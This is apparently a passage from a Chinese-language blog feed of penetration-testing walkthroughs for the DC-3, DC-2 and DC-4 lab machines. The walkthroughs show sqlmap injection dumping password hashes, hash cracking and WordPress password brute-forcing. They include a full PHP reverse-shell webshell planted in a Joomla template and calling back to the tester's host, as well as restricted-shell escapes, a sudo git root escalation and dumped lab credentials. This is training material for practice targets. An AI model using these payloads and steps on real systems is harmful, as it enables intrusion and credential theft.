+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] --dbs</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"><span class="comment">#显然joomladb就是网站的数据库了 当然也可以跑出来</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] --current-db</span><br><span class="line">15:55:43] [INFO] fetching current database</span><br><span class="line">[15:55:43] [INFO] resumed: <span class="string">'joomladb'</span></span><br><span class="line">current database:    <span class="string">'joomladb'</span></span><br><span class="line"><span class="comment"># 列表名：</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb --tables</span><br><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">-----------------------</span><br><span class="line">| <span class="comment">#__users            |</span></span><br><span class="line">-----------------------</span><br><span class="line"><span class="comment"># 76个表就不都写出来了</span></span><br><span class="line"><span class="comment"># 列字段</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T <span class="string">"#__users"</span> -columns</span><br><span class="line"><span class="keyword">do</span> you want to use common column existence check? [y/N/q]</span><br><span class="line"><span class="comment">#这里选择yes 然后选择1</span></span><br><span class="line">Database: joomladb</span><br><span class="line">Table: <span class="comment">#__users</span></span><br><span class="line">[5 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br><span class="line"><span class="comment"># 列出来了字段,把数据爆出来</span></span><br><span class="line">sqlmap -u <span class="string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T <span class="string">"#__users"</span> -C username,password --dump</span><br><span class="line">Database: joomladb</span><br><span class="line">Table: <span class="comment">#__users</span></span><br><span class="line">[1 entry]</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line"><span class="comment"># 用户名得到了，密码是加密的</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这里可以用<code>john</code>来破解，也可以用 <code>brupsuite</code> 来爆破</p>
+</li>
+<li><p>我们就用 <code>john</code> 来破解吧</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span> &gt; /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="comment"># note: 用双引号要加 \$ 把 $转义掉</span></span><br><span class="line"><span class="comment">#接着就是 ：</span></span><br><span class="line">john /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="comment">#得到密码：snoopy</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>登录之后</p>
+</li>
+<li><p>在template里面添加了一个木马（文件名设置成了1.php）</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*&lt;?php /**/</span> error_reporting(<span class="number">0</span>); $ip = <span class="string">'192.168.0.21'</span>; $port = <span class="number">4444</span>; <span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; $s_type = <span class="string">'socket'</span>; &#125; <span class="keyword">if</span> (!$s_type) &#123; <span class="keyword">die</span>(<span class="string">'no socket funcs'</span>); &#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; &#125; <span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; $a = unpack(<span class="string">"Nlen"</span>, $len); $len = $a[<span class="string">'len'</span>]; $b = <span class="string">''</span>; <span class="keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; &#125; &#125; $GLOBALS[<span class="string">'msgsock'</span>] = $s; $GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; <span class="keyword">if</span> (extension_loaded(<span class="string">'suhosin'</span>) &amp;&amp; ini_get(<span class="string">'suhosin.executor.disable_eval'</span>)) &#123; $suhosin_bypass=create_function(<span class="string">''</span>, $b); $suhosin_bypass(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">eval</span>($b); &#125; <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后用msf连接的</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.0.22</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"><span class="comment">#然后浏览器访问 http://192.168.0.22/templates/beez3/1.php</span></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.0.22</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.21:4444 -&gt; 192.168.0.22:55430) at 2020-04-29 16:43:47 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="comment"># 就连接上了</span></span><br><span class="line">meterpreter &gt; shell </span><br><span class="line"><span class="comment"># 进shell</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span> <span class="comment"># 获得标准shell</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后查看用户 <code>cd /home</code></p>
+</li>
+<li><p>发现只有一个dc3的用户</p>
+</li>
+<li><p>啥也没有</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null <span class="comment"># 找suid的文件</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>也没发现可以用的</p>
+</li>
+<li><p>只能试试系统提权了</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a <span class="comment">#查看内核信息</span></span><br><span class="line">	Linux DC-3 4.4.0-21-generic <span class="comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">cat /etc/*release <span class="comment">#查看版本信息</span></span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=16.04</span><br><span class="line">DISTRIB_CODENAME=xenial</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">"Ubuntu 16.04 LTS"</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"16.04 LTS (Xenial Xerus)"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 16.04 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"16.04"</span></span><br><span class="line">HOME_URL=<span class="string">"http://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"http://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"http://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">UBUNTU_CODENAME=xenial</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>3772…无法下载….</li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-2 靶机渗透</title>
+    <url>/DC-2/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-2靶机渗透">DC-2靶机渗透</a><ul>
+<li><a href="#1-渗透过程">1. 渗透过程</a></li>
+</ul>
+</li>
+<li><a href="#__the_ent__"><strong>!!!THE_ENT!!!</strong></a><ul>
+<li><a href="#2-重要信息">2. 重要信息</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+<h1><span id="dc-2靶机渗透">DC-2靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
+<li><p>主机发现： <code>nmap -sP 192.168.0.1/24</code></p>
+</li>
+<li><p>发现了DC-2的IP地址： <code>192.168.0.131</code></p>
+</li>
+<li><p>下载主机的时候要添加dns到hosts文件</p>
+</li>
+<li><p><code>echo “192.168.0.131    dc-2 ”  &gt;&gt; /etc/hosts</code></p>
+</li>
+<li><p>添加好了 ping一下 dc-2，ping 通了表示成功了</p>
+</li>
+<li><p>接下来就是端口发现了：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -A -p- -oN /tmp/DC-2.txt 192.168.0.131</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结果：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.70 scan initiated Mon Apr 27 14:28:47 2020 as: nmap -sS -A -p- -oN /tmp/DC-2.txt 192.168.0.131</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.131</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:F6:92:EE (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.33 ms 192.168.0.131</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Mon Apr 27 14:29:04 2020 -- 1 IP address (1 host up) scanned in 17.46 seconds</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>只有7744（ssh） 和 80 （http)</p>
+</li>
+<li><p>先看看http的</p>
+</li>
+<li><p>发现是一个 <code>wordpress</code>框架</p>
+</li>
+<li><p>还找到一个flag页面</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line">Log <span class="keyword">in</span> as one to see the next flag.</span><br><span class="line">If you can’t find it, <span class="built_in">log</span> <span class="keyword">in</span> as another.</span><br><span class="line"><span class="comment">#标志1：</span></span><br><span class="line"><span class="comment">#你通常的单词表可能不起作用，所以，也许你只需要试试cewl。</span></span><br><span class="line"><span class="comment">#密码越多越好，但有时你不能赢得所有的密码。</span></span><br><span class="line"><span class="comment">#作为一个登录以查看下一个标志。</span></span><br><span class="line"><span class="comment">#如果找不到，请以另一个身份登录。</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>提示是用 <code>cewl</code> 生成密码文件</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w /tmp/passwd.lst http://dc-2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后用这个密码来爆破</p>
+</li>
+<li><p>当然 <code>wordpress</code> 可以枚举用户名的</p>
+</li>
+<li><p>这里我们用<code>wpscan</code>来扫面</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先扫描用户</span></span><br><span class="line">wpscan --url https://dc-2/ --enumerate u</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到用户名：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>用户名：admin、jerry、tom</p>
+</li>
+<li><p>然后爆破其密码：(密码本就是刚刚我们用cewl生成的)</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --usernames admin,jerry,tom  --passwords  /tmp/passwd.lst</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>就扫面出来了两个密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line">[SUCCESS] - jerry / adipiscing</span><br><span class="line">[SUCCESS] - tom / parturient</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>现在就是登陆后台拿shell了</p>
+</li>
+<li><p>当然知道点wordpress的都知道 <code>http://dc-2/wp-admin/</code>就能登录后台</p>
+</li>
+<li><p>不知道的爆破一下目录也可以哦</p>
+</li>
+<li><p>然后就随便登录了一个</p>
+</li>
+<li><p>在page里面发现了 flag 2</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line">If you can<span class="string">'t exploit WordPress and take a shortcut, there is another way.</span></span><br><span class="line"><span class="string">Hope you found another entry point.</span></span><br><span class="line"><span class="string">标志2：</span></span><br><span class="line"><span class="string">如果你不能利用WordPress并抄近路，还有别的办法。</span></span><br><span class="line"><span class="string">希望你能找到另一个切入点。</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>看了一圈，也用msf搞了一顿~</p>
+</li>
+<li><p>还是没能拿到shell</p>
+</li>
+<li><p>还有别的办法？</p>
+</li>
+<li><p>那只有ssh了</p>
+</li>
+<li><p>前面扫到ssh在7744端口</p>
+</li>
+<li><p>那我们就连用这两个网站密码连一下看看</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh jerry@dc-2 -p 7744</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>发现登不进去 权限不足？</p>
+</li>
+<li><p>再试试tom</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh tom@dc-2 -p 7744</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这个能登进去</p>
+</li>
+<li><p>但是~</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$</span><br><span class="line">tom@DC-2:~$</span><br><span class="line">tom@DC-2:~$ id</span><br><span class="line">-rbash: id: <span class="built_in">command</span> not found</span><br><span class="line">tom@DC-2:~$</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat</span><br><span class="line">-rbash: cat: <span class="built_in">command</span> not found</span><br><span class="line">tom@DC-2:~$ sudo</span><br><span class="line">-rbash: sudo: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>连cat都被限制了</p>
+</li>
+<li><p>只能搞到我的kali机器看看了</p>
+</li>
+<li><p>先看看有没有scp</p>
+</li>
+<li><p>有~</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp flag3.txt root@192.168.0.21:/tmp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后输入以下密码就OK了</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># cat flag3.txt</span></span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su <span class="keyword">for</span> all the stress he causes.</span><br><span class="line"><span class="comment">#可怜的老汤姆老是追杰瑞。也许他应该为他造成的所有压力而宽慰。</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>现在限制了好多命令，而且启的还是rbash <code>echo $SHELL</code>可以看当前使用的shell</p>
+</li>
+<li><p>那我们切换到bash看看行不</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a <span class="comment">#(百度到这个可以还个零临时的用用)</span></span><br><span class="line"><span class="comment"># 换了之后还是没有命令？看看环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"> /home/tom/usr/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin</span><br><span class="line"><span class="comment">#自己设置一下环境变量</span></span><br><span class="line">su jerry 	<span class="comment">#切换到jerry</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>进了，还看到了flag4~</p>
+</li>
+<li><p>我们先看看flag4写的什么</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Good to see that you<span class="string">'ve made it this far - but you'</span>re not home yet.</span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).</span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">'re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>大概意思就是说用git离开这里~</p>
+</li>
+<li><p>我们还是先看看<code>history sudo -l  ...</code>这些命令</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>可以无密码使用root执行git</p>
+</li>
+<li><p>这个我也不咋会用</p>
+</li>
+<li><p>百度的到一个说是有个缓冲区漏洞</p>
+</li>
+<li><p>git 开启分页的时候可以输入命令启bash</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git -p config</span><br><span class="line">usage: git config [options]</span><br><span class="line"></span><br><span class="line">Config file location</span><br><span class="line">    --global              use global config file</span><br><span class="line">    --system              use system config file</span><br><span class="line">    --<span class="built_in">local</span>               use repository config file</span><br><span class="line">    -f, --file &lt;file&gt;     use given config file</span><br><span class="line">    --blob &lt;blob-id&gt;      <span class="built_in">read</span> config from given blob object</span><br><span class="line"></span><br><span class="line">Action</span><br><span class="line">    --get                 get value: name [value-regex]</span><br><span class="line">    --get-all             get all values: key [value-regex]</span><br><span class="line">    --get-regexp          get values <span class="keyword">for</span> regexp: name-regex [value-regex]</span><br><span class="line">    --get-urlmatch        get value specific <span class="keyword">for</span> the URL: section[.var] URL</span><br><span class="line">    --replace-all         replace all matching variables: name value [value_regex]</span><br><span class="line">    --add                 add a new variable: name value</span><br><span class="line">    --<span class="built_in">unset</span>               remove a variable: name [value-regex]</span><br><span class="line">    --<span class="built_in">unset</span>-all           remove all matches: name [value-regex]</span><br><span class="line">    --rename-section      rename section: old-name new-name</span><br><span class="line">    --remove-section      remove a section: name</span><br><span class="line">    -l, --list            list all</span><br><span class="line">    -e, --edit            open an editor</span><br><span class="line">    --get-color &lt;slot&gt;    find the color configured: [default]</span><br><span class="line">    --get-colorbool &lt;slot&gt;</span><br><span class="line">                          find the color setting: [stdout-is-tty]</span><br><span class="line">!bash</span><br><span class="line">root@DC-2:/home/jerry<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@DC-2:/home/jerry<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>要记得把屏幕缩小来哦要不然就不会出现分页了~</p>
+</li>
+<li><p>这样就拿到了root权限了</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DC-2:~<span class="comment"># cat final-flag.txt</span></span><br><span class="line"> __    __     _ _       _                    _</span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/</span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a twet via @DCAU7.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h1><span id="the_ent"><strong>!!!THE_ENT!!!</strong></span></h1></li>
+</ul>
+<h2><span id="2-重要信息">2. 重要信息</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 网站后台密码</span></span><br><span class="line">user1:tom</span><br><span class="line">passwd:parturient</span><br><span class="line">user2:jerry</span><br><span class="line">passwd:adipiscing</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后来在网站目录下搞到的</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpressdb'</span>);</span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'wpadmin'</span>);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'4uTiLL'</span>);</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-4 靶机渗透</title>
+    <url>/DC-4/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc4-靶机渗透">DC4 靶机渗透</a><ul>
+<li><a href="#1-渗透过程">1. 渗透过程</a></li>
+<li><a href="#__the_end__"><strong>!!!THE_END!!!</strong></a></li>
+<li><a href="#2-重要数据">2. 重要数据</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="dc4-靶机渗透">DC4 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
+<li>主机发现</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到IP地址： <code>192.168.0.123</code></p>
+</li>
+<li><p>扫描端口</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/workspace<span class="comment"># nmap -sS -A -p- 192.168.0.123</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-03 14:49 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.123</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:84:3B:AB (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>看看80端口</p>
+</li>
+<li><p>只有一个登录框</p>
+</li>
+<li><p>抓个包试试</p>
+</li>
+<li><p>先试试有没有sql注入</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.0.123 --data <span class="string">"username=admin&amp;password=1122"</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>并没发现sql注入</p>
+</li>
+<li><p>扫描下目录</p>
+</li>
+</ul>
